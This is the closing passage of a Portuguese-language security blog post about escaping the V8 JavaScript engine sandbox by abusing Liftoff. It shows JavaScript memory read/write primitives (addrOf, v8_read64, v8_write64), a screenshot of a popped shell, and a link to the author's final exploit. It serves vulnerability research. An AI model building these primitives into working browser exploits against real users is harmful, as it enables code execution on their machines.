<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">addrOf</span>(obj) {</span>
<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> Sandbox<span class="op">.</span><span class="fu">getAddressOf</span>(obj)<span class="op">;</span></span>
<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a>}</span>
<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">v8_read64</span>(addr) {</span>
<span id="cb20-8"><a href="#cb20-8" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> sandboxMemory<span class="op">.</span><span class="fu">getBigUint64</span>(<span class="bu">Number</span>(addr)<span class="op">,</span> <span class="kw">true</span>)<span class="op">;</span></span>
<span id="cb20-9"><a href="#cb20-9" aria-hidden="true" tabindex="-1"></a>}</span>
<span id="cb20-10"><a href="#cb20-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-11"><a href="#cb20-11" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">v8_write64</span>(addr<span class="op">,</span> val) {</span>
<span id="cb20-12"><a href="#cb20-12" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> sandboxMemory<span class="op">.</span><span class="fu">setBigInt64</span>(<span class="bu">Number</span>(addr)<span class="op">,</span> val<span class="op">,</span> <span class="kw">true</span>)<span class="op">;</span></span>
<span id="cb20-13"><a href="#cb20-13" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
<p>E para escrever o exploit, precisamos apenas <em>debuggar</em> um
pouco para encontrar os novos offsets e valores que precisamos/podemos
corromper:</p>
<figure>
<img
src="/assets/imgs/abusing-liftoff-assembly/poping-shell-memory-corruption-api.png"
alt="poping-shell-memory-corruption-api.png" />
<figcaption
aria-hidden="true">poping-shell-memory-corruption-api.png</figcaption>
</figure>
<p><a
href="https://github.com/R3tr074/exploits/blob/master/browser/v8/v8-sandbox-escape/exploit.js">Final
exploit</a></p>
<hr />
<p>Se você tiver qualquer duvida sobre o paper, fique a vontade para
entrar em <a href="https://twitter.com/r3tr074">contato</a>.</p>
</div>
<pre>
<footer>
  <a href="#">Home</a> | <a href="/blog/">Blog</a> | <a target="_blank" href="https://github.com/r3tr074/exploits">Exploit collection</a>  | <a href="/about.html">About me</a> | <a href="mailto:r@retr0.zip">Contact</a>
  2025 - <a target="_blank" href="https://twitter.com/r3tr074">r3tr074</a>
  </footer>
</pre>
</body>

</html>
